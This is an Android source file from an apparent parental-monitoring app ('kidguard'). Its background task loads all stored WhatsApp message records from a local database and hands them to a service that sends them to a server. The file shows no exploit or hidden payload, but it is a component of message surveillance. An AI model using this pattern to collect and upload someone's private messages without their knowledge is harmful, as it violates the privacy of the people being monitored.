package com.kidguard.asynctask;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.stmt.QueryBuilder;
import com.kidguard.model.WhatsApp;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.services.BackgroundDataService;

import java.sql.SQLException;
import java.util.ArrayList;

public class WhatsAppAsyncTask extends AsyncTask<Void, Void, ArrayList<WhatsApp>> {
    private static final String TAG = WhatsAppAsyncTask.class.getSimpleName();

    private DatabaseHelper databaseHelper = null;
    private ArrayList<WhatsApp> lstWhatsApp;
    private Dao<WhatsApp, Integer> whatsAppDao;
    private Context context;

    // WhatsAppAsyncTask Constructor
    public WhatsAppAsyncTask(Context context) {
        this.context = context;
    }

    // Database Helper
    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(context, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        lstWhatsApp = new ArrayList<>();
        try {
            whatsAppDao = getHelper().getWhatsAppDao();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected ArrayList<WhatsApp> doInBackground(Void... params) {
        try {
            if (whatsAppDao != null) {
                if (whatsAppDao.isTableExists()) {
                    long numRows = whatsAppDao.countOf();
                    if (numRows != 0) {
                        QueryBuilder<WhatsApp, Integer> queryBuilder = whatsAppDao.queryBuilder();
                        lstWhatsApp = (ArrayList<WhatsApp>) queryBuilder.query();
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return lstWhatsApp;
    }

    @Override
    protected void onPostExecute(ArrayList<WhatsApp> lstWhatsApp) {
        super.onPostExecute(lstWhatsApp);
        // Release databaseHelper
        if (databaseHelper != null) {
            databaseHelper = null;
        }

        Log.e(TAG, "WHATSAPP List???" + lstWhatsApp.size());
        new BackgroundDataService(context).sendWhatsAppDataToServer(lstWhatsApp);
    }
}